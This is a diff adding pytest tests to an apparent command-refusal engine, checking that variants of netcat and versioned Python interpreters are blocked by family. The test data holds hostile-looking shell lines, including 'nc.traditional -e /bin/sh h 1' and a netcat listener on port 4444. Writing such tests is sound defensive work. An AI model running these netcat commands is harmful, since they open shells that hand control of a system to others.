@@ -205,3 +205,26 @@ def test_abbreviated_long_options_are_matched(args, pattern, hit):
     """getopt_long and argparse accept any unambiguous prefix of a long
     option: GNU tar ran a command from --to-com=... in review of #14."""
     assert (refused_option(args, [pattern]) is not None) is hit
+
+
+@pytest.mark.parametrize(
+    "cmd",
+    [
+        "nc.traditional -e /bin/sh h 1",
+        "nc.openbsd -c id h 1",
+        "python3.14 -c 'print(1)'",
+        "/usr/bin/python3.12 -c x",
+    ],
+)
+def test_program_name_variants_are_judged_by_their_family(monkeypatch, cmd):
+    engine = _engine(
+        monkeypatch, ["nc.traditional", "nc.openbsd", "python3.14", "/usr/bin/python3.12"]
+    )
+    reason = _refusal(engine, cmd)
+    assert reason is not None and "is never allowed" in reason, cmd
+
+
+def test_your_rules_for_a_name_cover_its_variants(monkeypatch):
+    _write(paths.config_dir(), {"nc": ["-l"]})
+    engine = _engine(monkeypatch, ["nc.openbsd"])
+    assert _refusal(engine, "nc.openbsd -l 4444") is not None
